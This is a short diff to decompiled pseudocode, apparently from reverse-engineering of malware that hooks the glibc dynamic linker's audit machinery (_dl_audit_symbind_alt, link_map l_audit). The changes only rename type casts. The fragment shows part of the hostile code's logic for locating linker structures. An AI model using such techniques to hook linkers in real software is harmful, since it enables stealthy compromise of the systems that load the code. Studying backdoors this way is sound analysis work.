@@ -62,8 +62,8 @@ BOOL find_link_map_l_audit_any_plt
       libc_imports->resolved_imports_count = libc_imports->resolved_imports_count + 1;
     }
     audit_func_cursor = (hooks->ldso_ctx)._dl_audit_symbind_alt;
-    mask_register_bitmap._0_3_ = CONCAT12(0xff,(undefined2)mask_register_bitmap);
-    mask_register_bitmap = CONCAT22(mask_register_bitmap._2_2_,(undefined2)mask_register_bitmap) | 0x80;
+    mask_register_bitmap._0_3_ = CONCAT12(0xff,(ushort)mask_register_bitmap);
+    mask_register_bitmap = CONCAT22(mask_register_bitmap._2_2_,(ushort)mask_register_bitmap) | 0x80;
     output_register_bitmap._0_2_ = (ushort)output_register_bitmap | 2;
     audit_func_end = audit_func_cursor + (hooks->ldso_ctx)._dl_audit_symbind_alt__size;
     output_register_bitmap._3_1_ = SUB41(mask_filter_snapshot,3);
@@ -130,7 +130,7 @@ BOOL find_link_map_l_audit_any_plt
               search_ctx.output_register = (u8 *)&mask_register_bitmap;
             }
             else {
-              mask_register_bitmap._0_3_ = CONCAT12(l_name_reg_index,(undefined2)mask_register_bitmap);
+              mask_register_bitmap._0_3_ = CONCAT12(l_name_reg_index,(ushort)mask_register_bitmap);
               search_ctx_zero_cursor = (u32 *)((long)&search_ctx.offset_to_match + 4);
               for (wipe_idx = 7; wipe_idx != 0; wipe_idx = wipe_idx + -1) {
                 *search_ctx_zero_cursor = 0;
